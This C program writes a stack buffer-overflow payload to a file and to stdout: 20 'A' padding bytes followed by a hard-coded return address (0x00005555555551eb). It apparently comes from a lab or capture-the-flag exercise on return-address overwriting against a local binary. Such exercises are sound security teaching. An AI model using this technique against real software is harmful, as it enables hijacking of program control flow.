#include <stdio.h>

int main (void) 
{
    FILE* file = fopen("input.txt", "w");

    if (file == NULL) 
    {
        printf("Error! File cannot be created!\n");
    }

    else 
    {
        char str[28];
        for (int i = 0; i < 20; i++) 
        {
            str[i] = 0x41;
        }

        // 0x00005555555551eb
        str[20] = 0xeb;
        str[21] = 0x51;
        for (int i = 22; i < 26; i++) 
        {
            str[i] = 0x55;
        }
        str[26] = 0x00;
        str[27] = 0x00;      

        for (int i = 0; i < 28; i++) 
        {
            fputc(str[i], file);
        }  

        for (int i = 0; i < 28; i++) 
        {
            putc(str[i], stdout);
        }
        fclose(file);        
    }       
    
}